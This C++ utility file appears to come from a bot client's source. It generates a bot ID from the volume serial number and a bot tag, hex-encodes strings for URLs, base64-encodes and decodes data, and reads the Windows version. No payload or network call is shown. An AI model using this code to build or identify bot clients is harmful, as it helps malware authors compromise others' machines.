#include "stdafx.h"
#include "defines.h"
#include <string>
#include <sstream>
#include <iomanip>
#include "tools.h"
#include "debug.h"

void generateBotId(char * buffer, int size)
{
	DWORD serial;
	GetVolumeInformation(NULL, NULL, NULL, &serial, NULL, NULL, NULL, NULL);
	_itoa_s(serial % 100, buffer, size, 10);
	buffer[2] = GD_BOT_TAG;
	for (int i = 3; i < size; i++)
	{
		do 
		{
			buffer[i] = '0' + rand() % 75;
		} while (buffer[i] == '\\');
	}
} 

std::string hexencode(const std::string& input)
{
	std::ostringstream ssOut;
	ssOut << std::setbase(16);
	for (std::string::const_iterator i = input.begin(); i != input.end(); ++i)
	{
		if (isalnum(*i))
			ssOut << *i;
		else
			ssOut << '%' << std::setw(2) << std::setfill('0') << ((unsigned int)(unsigned char)*i);
	}
	return ssOut.str();
}

bool b64encodeA(BYTE * data, DWORD dataSize, LPSTR * dataOut)
{
	DWORD size;
	if (!CryptBinaryToStringA(data, dataSize, CRYPT_STRING_BASE64, NULL, &size))
	{
		WDEBUG("Could not b64 : " << GetLastError());
		return false;
	}

	*dataOut = new CHAR[size];

	if (!CryptBinaryToStringA(data, dataSize, CRYPT_STRING_BASE64, *dataOut, &size))
	{
		WDEBUG("Could not b64 : " << GetLastError());
		return false;
	}
	return true;
}

bool b64decodeA(LPCSTR data, DWORD dataSize, LPBYTE * dataOut, DWORD * dataSizeOut)
{
	if (!CryptStringToBinaryA(data, dataSize, CRYPT_STRING_BASE64, NULL, dataSizeOut, NULL, NULL))
	{
		WDEBUG("Could not b64 : " << GetLastError());
		return false;
	}

	*dataOut = new BYTE[*dataSizeOut];

	if (!CryptStringToBinaryA(data, dataSize, CRYPT_STRING_BASE64, *dataOut, dataSizeOut, NULL, NULL))
	{
		WDEBUG("Could not b64 : " << GetLastError());
		return false;
	}
	return true;
}

DWORD getOsVersion() 
{
	OSVERSIONINFO osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
	return osvi.dwMajorVersion;
}
